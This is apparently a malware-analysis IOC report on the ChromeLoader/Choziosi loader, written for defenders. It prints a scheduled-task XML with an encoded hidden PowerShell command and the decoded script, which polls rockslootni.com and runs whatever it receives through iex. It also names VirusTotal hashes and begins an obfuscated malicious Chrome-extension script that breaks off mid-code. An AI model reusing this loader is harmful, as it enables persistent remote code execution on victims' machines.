### Observed IOCs for ChoziosiLoaderII

```
first occurrence: 06-04-2022
```

### Description

I did not see any available breakdown regarding this malware, so I am documenting the observed IOCs to better understand the threat.  This will be shared to you in hopes that it will be helpful to you.  I am not the first to discover this threat, two IOCs that were similar to mine were already submitted earlier.  I will continue to gather more information over time.

### Delivery Method

Research is still ongoing regarding the delivery method.

### The Schedule task

Once the malware is executed, the following scheduled tasks are created

scheduled task #1

`C:\windows\system32\tasks\chrome bookmarks`

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Chrome bookmarks</Description>
    <URI>\chrome bookmarks</URI>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT50M</Interval>
        <StopAtDurationEnd>true</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2022-06-06T14:14:54Z</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>PT10M</Duration>
      <WaitTimeout>PT1H</WaitTimeout>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>cmd</Command>
      <Arguments>/c powershell -WindowStyle Hidden -E "CgAKACQAagBkACAAPQAgACQAbgB1AGwAbAA7AAoAJABzAHQAYQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQA7AAoACgAKAAoAZgB1AG4AYwB0AGkAbwBuACAAcwBsAHQAVgBhAGwAdQBlACgAWwBzAHQAcgBpAG4AZwBdACQAYQByADIAKQAgAHsACgAJACQAYQByADEAPQBbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABhAHIAMgApADsACgAKAAkAJABzAHQAPQAkAHMAdABhAC4ARwBlAHQAQgB5AHQAZQBzACgAJwBHAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5AFYAYQBsAHUAZQAnACkAOwAKAAkAJABlAGQAPQAkAGEAcgAxAFsAMAAuAC4ANABdADsACgAKAAkAJABpAD0AMAA7AAoACQAkAGwAPQAkAGUAZAAuAEwAZQBuAGcAdABoADsACgAJACQAawA9AEAAKAApADsACgAKAAkAWwBhAHIAcgBhAHkAXQA6ADoAUgBlAHMAaQB6AGUAKABbAHIAZQBmAF0AJABrACwAJABzAHQALgBsAGUAbgBnAHQAaAApADsACgAJAGYAbwByAGUAYQBjAGgAKAAkAGIAIABpAG4AIAAkAHMAdAApACAAewAkAGsAWwAkAGkAKwArAF0APQAkAGIAIAAtAGIAeABvAHIAIAAkAGUAZABbACQAaQAlACQAbABdAH0ACgAKAAkAJABiAHMAPQAkAGEAcgAxAFsANQAuAC4AJABhAHIAMQAuAGwAZQBuAGcAdABoAF0AOwAKAAoACQAkAGkAPQAwADsACgAJACQAbAA9ACQAawAuAEwAZQBuAGcAdABoADsACgAJACQAZAB0AD0AQAAoACkAOwAKAAoACQBbAGEAcgByAGEAeQBdADoAOgBSAGUAcwBpAHoAZQAoAFsAcgBlAGYAXQAkAGQAdAAsACQAYgBzAC4AbABlAG4AZwB0AGgAKQA7AAoACQBmAG8AcgBlAGEAYwBoACgAJABiACAAaQBuACAAJABiAHMAKQAgAHsAJABkAHQAWwAkAGkAKwArAF0APQAkAGIAIAAtAGIAeABvAHIAIAAkAGsAWwAkAGkAJQAkAGwAXQB9AAoACgAJAHIAZQB0AHUAcgBuACAAJABzAHQAYQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAHQAKQAgAHwAIABDAG8AbgB2AGUAcgB0AEYAcgBvAG0ALQBKAHMAbwBuADsACgB9AAoACgAkAHYAIAA9ACAAIgAwACIAOwAKACQAbAB2ACAAPQAgACIANgAiADsACgAkAGQAIAA9ACAAIgByAG8AYwBrAHMAbABvAG8AdABuAGkALgBjAG8AbQAiADsACgAkAGUAcAAgAD0AIAAiAFcAeQBJAHgATQBEAE0AdwBOAEQAYwAxAE0AagBrAHgATwBUAFUAegBNAHoAawB6AE4AagBJAGkATABEAEUAMgBOAFQASQB6AE4AagBNADMATQBUAFIAZAAiADsACgAKACQAcABhAHQAaABSAEcAIAA9ACAAIgBIAEsAQwBVADoAXABTAG8AZgB0AHcAYQByAGUAXABhAGkAZwBuAGUAcwBcACIAOwAKAAoAJABqAHAAPQAkAG4AdQBsAGwAOwAKAHQAcgB5ACAAewAKAAkAJABqAHAAPQAkAHMAdABhAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABlAHAAKQApACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AOwAKAH0AIABjAGEAdABjAGgAewB9AAoACgAkAGEAIAA9ACAAJABzAHQAYQA7AAoACgAkAHUAPQAkAGoAcABbADAAXQA7AAoAJABpAHMAPQAkAGoAcABbADEAXQA7AAoACgAkAHIATgBhAG0AZQAgAD0AIAAiAGQAZQBhAGQAbABpAG4AawBzACIAOwAKAAoAdwBoAGkAbABlACgAJAB0AHIAdQBlACkAIAB7AAoACQB0AHIAeQAgAHsACgAJAAkAdAByAHkAIAB7AAoACQAJAAkAaQBmACAAKAAhACgAVABlAHMAdAAtAFAAYQB0AGgAIAAkAHAAYQB0AGgAUgBHACkAKQAgAHsACgAJAAkACQAJAE4AZQB3AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACQAcABhAHQAaABSAEcAIAB8ACAATwB1AHQALQBOAHUAbABsADsACgAJAAkACQB9AAoACQAJAH0AYwBhAHQAYwBoAHsAfQAKAAoACQAJACQAZQB4ACAAPQAgACQAZgBhAGwAcwBlADsACgAKAAkACQBpAGYAIAAoACQAagBkACAALQBlAHEAIAAkAG4AdQBsAGwAKQAgAHsACgAJAAkACQB0AHIAeQAgAHsACgAJAAkACQAJACQAcgAgAD0AIABHAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5AFYAYQBsAHUAZQAgAC0AUABhAHQAaAAgACQAcABhAHQAaABSAEcAIAAtAE4AYQBtAGUAIAAkAHIATgBhAG0AZQA7AAoACQAJAAkACQAkAGoAZAAgAD0AIABzAGwAdABWAGEAbAB1AGUAKAAkAHIAKQA7AAoACgAJAAkACQAJACQAdgAgAD0AIAAkAGoAZABbADAAXQA7AAoACgAJAAkACQAJACQAZQB4ACAAPQAgACQAdAByAHUAZQA7AAoACQAJAAkAfQBjAGEAdABjAGgAewB9AAoACQAJAH0AIABlAGwAcwBlACAAewAKAAkACQAJACQAdgAgAD0AIAAkAGoAZABbADAAXQA7AAoACQAJAH0ACgAKAAkACQB0AHIAeQAgAHsACgAJAAkACQAkAGQAdAAgAD0AIAB3AGcAZQB0ACAAIgBoAHQAdABwAHMAOgAvAC8AJABkAC8AeAA/AHUAPQAkAHUAJgBpAHMAPQAkAGkAcwAmAGwAdgA9ACQAbAB2ACYAcgB2AD0AJAB2ACIAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnADsACgAKAAkACQAJACQAagBkADIAIAA9ACAAcwBsAHQAVgBhAGwAdQBlACgAJABkAHQAKQA7AAoACQAJAAkAaQBmACAAKAAkAGoAZAAyAFsAMABdACAALQBnAHQAIAAkAHYAKQAgAHsACgAJAAkACQAJACQAdgAyACAAPQAgACQAagBkADIAWwAwAF0AOwAKAAoACQAJAAkACQBOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJABwAGEAdABoAFIARwAgAC0ATgBhAG0AZQAgACQAcgBOAGEAbQBlACAALQBWAGEAbAB1AGUAIAAkAGQAdAAgAC0AUAByAG8AcABlAHIAdAB5AFQAeQBwAGUAIAAiAFMAdAByAGkAbgBnACIAIAAtAEYAbwByAGMAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwAOwAKAAkACQAJAAkAJABqAGQAIAA9ACAAJABqAGQAMgA7AAoACQAJAAkACQAkAGUAeAAgAD0AIAAkAHQAcgB1AGUAOwAKAAkACQAJAH0ACgAJAAkAfQBjAGEAdABjAGgAewB9AAoACgAJAAkAaQBmACAAKAAkAGUAeAAgAC0AZQBxACAAJAB0AHIAdQBlACkAIAB7AAoACQAJAAkAdAByAHkAewAKAAkACQAJAAkAcwB0AG8AcAA7AAoACQAJAAkAfQBjAGEAdABjAGgAewB9AAoACgAJAAkACQB0AHIAeQAgAHsACgAJAAkACQAJAGkAZQB4ACAAJABqAGQAWwAxAF0AOwAKAAkACQAJAH0AYwBhAHQAYwBoAHsAfQAKAAkACQB9AAoACQB9ACAAYwBhAHQAYwBoAHsAfQAKAAoACQB0AHIAeQAgAHsACgAJAAkAJABzAGwAcwAgAD0AIAAoACgAZwBlAHQALQByAGEAbgBkAG8AbQAgADcAMAAgAC0AbQBpAG4AaQBtAHUAbQAgADUAMAApACoANgAwACkAOwAKAAkACQAkAHQAcwAgAD0AIABbAGkAbgB0AF0AKABHAGUAdAAtAEQAYQB0AGUAIAAtAFUARgBvAHIAbQBhAHQAIAAlAHMAKQA7AAoACgAJAAkAOgBzAGwAIAB3AGgAaQBsAGUAKAAkAHQAcgB1AGUAKQAgAHsACgAJAAkACQB0AHIAeQB7AAoACQAJAAkACQByAHUAbgAoACQAZAAsACQAdQAsACQAaQBzACkAOwAKAAkACQAJAH0AYwBhAHQAYwBoAHsAfQAKAAoACQAJAAkAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAAKABnAGUAdAAtAHIAYQBuAGQAbwBtACAANgA1ACAALQBtAGkAbgBpAG0AdQBtACAAMgA1ACkAOwAKAAkACQAJACQAdABzADIAIAA9ACAAWwBpAG4AdABdACgARwBlAHQALQBEAGEAdABlACAALQBVAEYAbwByAG0AYQB0ACAAJQBzACkAOwAKAAoACQAJAAkAaQBmACAAKAAoACQAdABzADIALQAkAHQAcwApACAALQBnAHQAIAAkAHMAbABzACkAIAB7AAoACQAJAAkACQBiAHIAZQBhAGsAIABzAGwAOwAKAAkACQAJAH0ACgAJAAkAfQAKAAkAfQAgAGMAYQB0AGMAaAB7AH0ACgB9AA=="</Arguments>
    </Exec>
  </Actions>
  <Principals>
    <Principal id="Author">
      <UserId>redactedusername</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
</Task>
```

Scheduled task #2

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\TREE\chrome bookmarks

Property   Type Value
--------   ---- -----
SD       Binary (0x)01,00,04,80,94,00,00,00,b0,00,00,00,00,00,00,00,14,00,00,00,02,00,80,00,04,00,00,00,00,10,18,00,9f,01,1f,00,01,02,00,00,00,00,00,0
                5,20,00,00,00,20,02,00,00,00,10,14,00,9f,01,1f,00,01,01,00,00,00,00,00,05,12,00,00,00,00,10,24,00,ff,01,1f,00,01,05,00,00,00,00,00,05,
                15,00,00,00,bd,00,99,7c,1b,27,8c,bf,73,50,5f,d6,e9,03,00,00,00,00,24,00,89,00,12,00,01,05,00,00,00,00,00,05,15,00,00,00,bd,00,99,7c,1b
                ,27,8c,bf,73,50,5f,d6,e9,03,00,00,00,00,00,00,01,05,00,00,00,00,00,05,15,00,00,00,bd,00,99,7c,1b,27,8c,bf,73,50,5f,d6,e9,03,00,00,01,0
                5,00,00,00,00,00,05,15,00,00,00,bd,00,99,7c,1b,27,8c,bf,73,50,5f,d6,01,02,00,00
Id       String {15DF158E-0B9C-4CBC-B177-C0569B5635C4}
Index     DWord 3

```

### Execution of scheduled task

The following base64 decoded PowerShell script is then loaded in memory.

https://www.virustotal.com/gui/file/2f8462ee6a1055e5ec0ac139deed546b5bdf4251bddb7de67106c3b43ce0d552/details

```powershell
$jd = $null;
$sta=[System.Text.Encoding]::ASCII;



function sltValue([string]$ar2) {
	$ar1=[System.Convert]::FromBase64String($ar2);

	$st=$sta.GetBytes('Get-ItemPropertyValue');
	$ed=$ar1[0..4];

	$i=0;
	$l=$ed.Length;
	$k=@();

	[array]::Resize([ref]$k,$st.length);
	foreach($b in $st) {$k[$i++]=$b -bxor $ed[$i%$l]}

	$bs=$ar1[5..$ar1.length];

	$i=0;
	$l=$k.Length;
	$dt=@();

	[array]::Resize([ref]$dt,$bs.length);
	foreach($b in $bs) {$dt[$i++]=$b -bxor $k[$i%$l]}

	return $sta.GetString($dt) | ConvertFrom-Json;
}

$v = "0";
$lv = "6";
$d = "rockslootni.com";
$ep = "WyIxMDMwNDc1MjkxOTUzMzkzNjIiLDE2NTIzNjM3MTRd";

$pathRG = "HKCU:\Software\aignes\";

$jp=$null;
try {
	$jp=$sta.GetString([System.Convert]::FromBase64String($ep)) | ConvertFrom-Json;
} catch{}

$a = $sta;

$u=$jp[0];
$is=$jp[1];

$rName = "deadlinks";

while($true) {
	try {
		try {
			if (!(Test-Path $pathRG)) {
				New-Item -Path $pathRG | Out-Null;
			}
		}catch{}

		$ex = $false;

		if ($jd -eq $null) {
			try {
				$r = Get-ItemPropertyValue -Path $pathRG -Name $rName;
				$jd = sltValue($r);

				$v = $jd[0];

				$ex = $true;
			}catch{}
		} else {
			$v = $jd[0];
		}

		try {
			$dt = wget "https://$d/x?u=$u&is=$is&lv=$lv&rv=$v" -UseBasicParsing;

			$jd2 = sltValue($dt);
			if ($jd2[0] -gt $v) {
				$v2 = $jd2[0];

				New-ItemProperty -Path $pathRG -Name $rName -Value $dt -PropertyType "String" -Force | Out-Null;
				$jd = $jd2;
				$ex = $true;
			}
		}catch{}

		if ($ex -eq $true) {
			try{
				stop;
			}catch{}

			try {
				iex $jd[1];
			}catch{}
		}
	} catch{}

	try {
		$sls = ((get-random 70 -minimum 50)*60);
		$ts = [int](Get-Date -UFormat %s);

		:sl while($true) {
			try{
				run($d,$u,$is);
			}catch{}

			Start-Sleep (get-random 65 -minimum 25);
			$ts2 = [int](Get-Date -UFormat %s);

			if (($ts2-$ts) -gt $sls) {
				break sl;
			}
		}
	} catch{}
}
```

Two PowerShell scripts were uploaded to Virus total by other users earlier this month. Thank you to Twitter user @cbecks_2 for providing the VT links below.

https://www.virustotal.com/gui/file/f316ea9158ba6704346ccd40b75b7c8d936c757282e1b476f0d42bc2f745dbdd/relations  
https://www.virustotal.com/gui/file/f3dca53c94c49283bf2a116482b6fdcda777c7c07c53d67833da03b93289fdbb/relations  

Dropper domain: rockslootni[.]com

### The Chrome Extension

Thanks to Twitter user @th3_protoCOL, we were able to determine that this new variant of Choziosi downloads a malicious Chrome Extension to disk.

https://www.virustotal.com/gui/file/0f5fb924eb5eb646ba6789db665545a08c0438e99e5a24f27c37bc0279b1a8a6/detection

### Contents of the malicious Chrome Extension provided by Twitter user @th3_protoCOL and @cbecks_2

```
ls
background.js  manifest.json  properties.png
```

https://www.virustotal.com/gui/file/0f5fb924eb5eb646ba6789db665545a08c0438e99e5a24f27c37bc0279b1a8a6/details

```
FileName: background.js
FileHash: 5415237a6faeca950193c5a702d838e5ab3fb337a74f0d344f64051d0d817364
```

### Obfuscated javascript `background.js`

```
(function(data){L5zz[547148]=(function(){var f=2;for(;f !== 9;){switch(f){case 2:f=typeof globalThis === '\x6f\x62\u006a\x65\u0063\x74'?1:5;break;case 1:return globalThis;break;case 5:var L;try{var J=2;for(;J !== 6;){switch(J){case 2:Object['\x64\u0065\x66\x69\u006e\x65\u0050\x72\x6f\x70\u0065\x72\u0074\u0079'](Object['\u0070\u0072\x6f\u0074\u006f\u0074\x79\x70\x65'],'\x71\u0036\u0079\x74\x36',{'\x67\x65\x74':function(){var K=2;for(;K !== 1;){switch(K){case 2:return this;break;}}},'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':true});L=q6yt6;L['\u0059\u006c\x78\x55\x58']=L;J=4;break;case 4:J=typeof YlxUX === '\u0075\x6e\x64\u0065\u0066\x69\u006e\x65\u0064'?3:9;break;case 3:throw "";J=9;break;case 9:delete L['\u0059\u006c\u0078\x55\x58'];var c=Object['\x70\u0072\x6f\x74\u006f\u0074\x79\x70\u0065'];delete c['\u0071\x36\x79\u0074\x36'];J=6;break;}}}catch(m){L=window;}return L;break;}}})();L5zz.a5zz=a5zz;F9(L5zz[547148]);L5zz[316777]=(function(){var C0=2;for(;C0 !== 5;){switch(C0){case 2:var g0={F0:(function(s0){var w0=2;for(;w0 !== 10;){switch(w0){case 2:var M0=function(H0){var D0=2;for(;D0 !== 13;){switch(D0){case 8:N0=h0.g0nn(function(){var T0=2;for(;T0 !== 1;){switch(T0){case 2:return 0.5 - Q0nn.J0nn();break;}}}).o0nn('');D0=7;break;case 9:var N0,v0;D0=8;break;case 3:I0++;D0=5;break;case 6:D0=!v0?8:14;break;case 7:v0=L5zz[N0];D0=6;break;case 4:h0.c0nn(i0nn.F0nn(H0[I0] + 74));D0=3;break;case 14:return v0;break;case 5:D0=I0 < H0.length?4:9;break;case 1:var I0=0;D0=5;break;case 2:var h0=[];D0=1;break;}}};var Q0='',r0=f0nn(M0([48,23,-21,48])());w0=5;break;case 5:var f0=0,o0=0;w0=4;break;case 4:w0=f0 < r0.length?3:6;break;case 3:w0=o0 === s0.length?9:8;break;case 9:o0=0;w0=8;break;case 8:Q0+=i0nn.F0nn(r0.r0nn(f0) ^ s0.r0nn(o0));w0=7;break;case 7:(f0++,o0++);w0=4;break;case 6:Q0=Q0.b0nn('[');var J0=0;var Z0=function(m0){var O0=2;for(;O0 !== 17;){switch(O0){case 2:O0=J0 === 0 && m0 === 50?1:4;break;case 19:g0.F0=b0;O0=18;break;case 10:O0=J0 === 6 && m0 === 63?20:19;break;case 1:Q0.s0nn.M0nn(Q0,Q0.Z0nn(-4,4).Z0nn(0,2));O0=5;break;case 7:O0=J0 === 3 && m0 === 11?6:14;break;case 6:Q0.s0nn.M0nn(Q0,Q0.Z0nn(-9,9).Z0nn(0,7));O0=5;break;case 12:O0=J0 === 5 && m0 === 66?11:10;break;case 14:O0=J0 === 4 && m0 === 24?13:12;break;case 13:Q0.s0nn.M0nn(Q0,Q0.Z0nn(-6,6).Z0nn(0,5));O0=5;break;case 5:return J0++;break;case 20:Q0.s0nn.M0nn(Q0,Q0.Z0nn(-9,9).Z0nn(0,8));O0=5;break;case 4:O0=J0 === 1 && m0 === 106?3:9;break;case 8:Q0.s0nn.M0nn(Q0,Q0.Z0nn(-5,5).Z0nn(0,4));O0=5;break;case 9:O0=J0 === 2 && m0 === 17?8:7;break;case 11:Q0.s0nn.M0nn(Q0,Q0.Z0nn(-9,9).Z0nn(0,8));O0=5;break;case 3:Q0.s0nn.M0nn(Q0,Q0.Z0nn(-9,9).Z0nn(0,8));O0=5;break;case 18:return b0(m0);break;}}};w0=12;break;case 12:var b0=function(U0){var V0=2;for(;V0 !== 1;){switch(V0){case 2:return Q0[U0];break;}}};return Z0;break;}}})('IECK$Y')};return g0;break;}}})();L5zz.l0=function(){return typeof L5zz[316777].F0 === 'function'?L5zz[316777].F0.apply(L5zz[316777],arguments):L5zz[316777].F0;};L5zz.e0=function(){return typeof L5zz[316777].F0 === 'function'?L5zz[316777].F0.apply(L5zz[316777],arguments):L5zz[316777].F0;};L5zz[101881]=false;function L5zz(){}function F9(L0e){function K8(b0e){var I0e=2;for(;I0e !== 5;){switch(I0e){case 2:var n0e=[arguments];return n0e[0][0].RegExp;break;}}}function o8(R0e){var x0e=2;for(;x0e !== 5;){switch(x0e){case 2:var k0e=[arguments];return k0e[0][0].String;break;}}}function c8(t0e){var N0e=2;for(;N0e !== 5;){switch(N0e){case 2:var H0e=[arguments];return H0e[0][0].Array;break;}}}var i0e=2;for(;i0e !== 143;){switch(i0e){case 52:Z0e[97]="__o";Z0e[24]="";Z0e[24]="8";Z0e[95]="";i0e=48;break;case 111:Z0e[66]+=Z0e[94];Z0e[66]+=Z0e[94];Z0e[13]=Z0e[3];Z0e[13]+=Z0e[61];i0e=107;break;case 41:Z0e[31]="";Z0e[10]="__res";Z0e[91]="f";Z0e[31]="e";i0e=37;break;case 15:Z0e[27]="";Z0e[27]="s0";Z0e[94]="";Z0e[18]="b";i0e=24;break;case 11:Z0e[9]="o";Z0e[2]="i0";Z0e[7]="";Z0e[7]="";Z0e[7]="f0";Z0e[6]="";Z0e[6]="r0";i0e=15;break;case 84:Z0e[83]+=Z0e[24];Z0e[55]=Z0e[10];Z0e[55]+=Z0e[58];Z0e[55]+=Z0e[34];i0e=80;break;case 126:A8(r8,"String",Z0e[78],Z0e[89]);i0e=125;break;case 128:var A8=function(s0e,E0e,l0e,C0e){var w0e=2;for(;w0e !== 5;){switch(w0e){case 2:var g0e=[arguments];Z8(Z0e[0][0],g0e[0][0],g0e[0][1],g0e[0][2],g0e[0][3]);w0e=5;break;}}};i0e=127;break;case 60:Z0e[98]="88";Z0e[26]="";Z0e[87]="4";Z0e[26]="";i0e=56;break;case 145:A8(r8,Z0e[17],Z0e[78],Z0e[64]);i0e=144;break;case 88:Z0e[47]+=Z0e[87];Z0e[47]+=Z0e[98];Z0e[83]=Z0e[91];Z0e[83]+=Z0e[77];i0e=84;break;case 35:Z0e[63]="0n";Z0e[34]="l";Z0e[61]="0";Z0e[54]="Z";Z0e[58]="";i0e=30;break;case 24:Z0e[94]="n";Z0e[86]="";Z0e[86]="nn";Z0e[34]="";i0e=35;break;case 120:A8(r8,"decodeURI",Z0e[78],Z0e[36]);i0e=152;break;case 150:A8(c8,"unshift",Z0e[45],Z0e[15]);i0e=149;break;case 37:Z0e[92]="";Z0e[92]="ptimiz";Z0e[97]="";Z0e[97]="";i0e=52;break;case 99:Z0e[15]+=Z0e[94];Z0e[25]=Z0e[18];Z0e[25]+=Z0e[63];Z0e[25]+=Z0e[94];i0e=95;break;case 121:A8(c8,"join",Z0e[45],Z0e[75]);i0e=120;break;case 127:A8(c8,"push",Z0e[45],Z0e[48]);i0e=126;break;case 115:Z0e[90]=Z0e[4];Z0e[90]+=Z0e[61];Z0e[90]+=Z0e[86];Z0e[66]=Z0e[5];i0e=111;break;case 107:Z0e[13]+=Z0e[86];Z0e[72]=Z0e[1];Z0e[72]+=Z0e[94];Z0e[72]+=Z0e[94];i0e=134;break;case 64:Z0e[80]="";Z0e[80]="";Z0e[80]="__ab";Z0e[98]="";i0e=60;break;case 103:Z0e[22]+=Z0e[63];Z0e[22]+=Z0e[94];Z0e[15]=Z0e[27];Z0e[15]+=Z0e[94];i0e=99;break;case 144:A8(r8,Z0e[16],Z0e[78],Z0e[74]);i0e=143;break;case 130:Z0e[48]+=Z0e[63];Z0e[48]+=Z0e[94];i0e=128;break;case 122:A8(p8,"random",Z0e[78],Z0e[90]);i0e=121;break;case 2:var Z0e=[arguments];Z0e[1]="";Z0e[1]="F0";Z0e[3]="";Z0e[3]="g";i0e=9;break;case 80:Z0e[14]=Z0e[54];Z0e[14]+=Z0e[61];Z0e[14]+=Z0e[86];Z0e[22]=Z0e[44];i0e=103;break;case 124:A8(c8,"sort",Z0e[45],Z0e[13]);i0e=123;break;case 71:Z0e[16]+=Z0e[11];Z0e[64]=Z0e[95];Z0e[64]+=Z0e[24];Z0e[64]+=Z0e[24];i0e=67;break;case 67:Z0e[17]=Z0e[97];Z0e[17]+=Z0e[92];Z0e[17]+=Z0e[31];Z0e[47]=Z0e[81];i0e=88;break;case 134:Z0e[89]=Z0e[2];Z0e[89]+=Z0e[94];Z0e[89]+=Z0e[94];Z0e[48]=Z0e[8];i0e=130;break;case 151:A8(o8,"split",Z0e[45],Z0e[25]);i0e=150;break;case 152:A8(o8,"charCodeAt",Z0e[45],Z0e[85]);i0e=151;break;case 48:Z0e[95]="Z4";Z0e[38]="";Z0e[38]="";Z0e[11]="ract";Z0e[38]="st";i0e=64;break;case 125:A8(o8,"fromCharCode",Z0e[78],Z0e[72]);i0e=124;break;case 9:Z0e[5]="";Z0e[5]="";Z0e[5]="Q0";Z0e[8]="c";Z0e[9]="";Z0e[9]="";Z0e[4]="J";i0e=11;break;case 30:Z0e[58]="idua";Z0e[44]="M";Z0e[77]="";Z0e[77]="48";Z0e[81]="";Z0e[81]="C";i0e=41;break;case 146:A8(K8,"test",Z0e[45],Z0e[47]);i0e=145;break;case 149:A8(Q8,"apply",Z0e[45],Z0e[22]);i0e=148;break;case 95:Z0e[85]=Z0e[6];Z0e[85]+=Z0e[94];Z0e[85]+=Z0e[94];Z0e[36]=Z0e[7];Z0e[36]+=Z0e[94];i0e=119;break;case 147:A8(r8,Z0e[55],Z0e[78],Z0e[83]);i0e=146;break;case 56:Z0e[26]="a";Z0e[45]=1;Z0e[78]=0;Z0e[74]=Z0e[26];i0e=75;break;case 119:Z0e[36]+=Z0e[94];Z0e[75]=Z0e[9];Z0e[75]+=Z0e[63];Z0e[75]+=Z0e[94];i0e=115;break;case 148:A8(c8,"splice",Z0e[45],Z0e[14]);i0e=147;break;case 123:A8(r8,"Math",Z0e[78],Z0e[66]);i0e=122;break;case 75:Z0e[74]+=Z0e[87];Z0e[74]+=Z0e[98];Z0e[16]=Z0e[80];Z0e[16]+=Z0e[38];i0e=71;break;}}function p8(j0e){var V0e=2;for(;V0e !== 5;){switch(V0e){case 2:var y0e=[arguments];return y0e[0][0].Math;break;}}}function Q8(e0e){var D0e=2;for(;D0e !== 5;){switch(D0e){case 2:var v0e=[arguments];return v0e[0][0].Function;break;}}}function Z8(F0e,Y0e,m0e,G0e,P0e){var q0e=2;for(;q0e !== 14;){switch(q0e){case 6:try{var h0e=2;for(;h0e !== 6;){switch(h0e){case 2:z0e[4]={};z0e[6]=(1,z0e[0][1])(z0e[0][0]);h0e=5;break;case 5:z0e[3]=[z0e[6],z0e[6].prototype][z0e[0][3]];z0e[3][z0e[0][4]]=z0e[3][z0e[0][2]];z0e[4].set=function(T0e){var S0e=2;for(;S0e !== 5;){switch(S0e){case 2:var J0e=[arguments];z0e[3][z0e[0][2]]=J0e[0][0];S0e=5;break;}}};z0e[4].get=function(){var a0e=2;for(;a0e !== 12;){switch(a0e){case 2:var U0e=[arguments];U0e[7]="";U0e[7]="ned";U0e[5]="i";a0e=3;break;case 3:U0e[4]="";U0e[4]="";U0e[4]="undef";U0e[1]=U0e[4];a0e=6;break;case 6:U0e[1]+=U0e[5];U0e[1]+=U0e[7];return typeof z0e[3][z0e[0][2]] == U0e[1]?undefined:z0e[3][z0e[0][2]];break;}}};z0e[4].enumerable=z0e[9];try{var f0e=2;for(;f0e !== 3;){switch(f0e){case 2:z0e[5]=z0e[8];z0e[5]+=z0e[7];z0e[5]+=z0e[1];f0e=4;break;case 4:z0e[0][0].Object[z0e[5]](z0e[3],z0e[0][4],z0e[4]);f0e=3;break;}}}catch(m8){}h0e=6;break;}}}catch(P8){}q0e=14;break;case 3:z0e[7]="inePro";z0e[8]="def";z0e[9]=true;z0e[9]=false;q0e=6;break;case 2:var z0e=[arguments];z0e[1]="";z0e[1]="perty";z0e[7]="";q0e=3;break;}}}function r8(d0e){var B0e=2;for(;B0e !== 5;){switch(B0e){case 2:var W0e=[arguments];return W0e[0][0];break;}}}}L5zz[538572]=L5zz[547148];L5zz[304484]=523;L5zz[79435]="LPf";L5zz.G5=function(){return typeof L5zz[615146].B8 === 'function'?L5zz[615146].B8.apply(L5zz[615146],arguments):L5zz[615146].B8;};L5zz[547148].N533=L5zz;L5zz[615146]=(function(){var j5=2;for(;j5 !== 9;){switch(j5){case 2:var A5=[arguments];A5[6]=undefined;A5[8]={};A5[8].B8=function(){var B5=2;for(;B5 !== 145;){switch(B5){case 62:q5[34].l5=['h5'];q5[34].y5=function(){var o7=function(){return String.fromCharCode(0x61);};var S7=!(/\x30\x78\x36\x31/).C488(o7 + []);return S7;};q5[41]=q5[34];q5[25]={};q5[25].l5=['h5'];q5[25].y5=function(){var T7=function(){return ('aaa').includes('a');};var H7=(/\x74\x72\x75\x65/).C488(T7 + []);return H7;};B5=56;break;case 109:q5[4].c0nn(q5[2]);q5[4].c0nn(q5[6]);q5[4].c0nn(q5[64]);q5[4].c0nn(q5[41]);B5=105;break;case 8:q5[1].y5=function(){var d6=typeof f488 === 'function';return d6;};q5[8]=q5[1];q5[5]={};B5=14;break;case 39:q5[68]={};q5[68].l5=['J1','U1'];q5[68].y5=function(){var r7=function(c7){return c7 && c7['b'];};var x7=(/\u002e/).C488(r7 + []);return x7;};q5[94]=q5[68];B5=54;break;case 11:q5[7]={};q5[7].l5=['h5'];q5[7].y5=function(){var W6=function(){return ('X').toLocaleLowerCase();};var Q6=(/\x78/).C488(W6 + []);return Q6;};q5[2]=q5[7];B5=18;break;case 88:q5[85]=q5[97];q5[47]={};B5=86;break;case 123:B5=q5[46] < q5[61][q5[42]].length?122:150;break;case 2:var q5=[arguments];B5=1;break;case 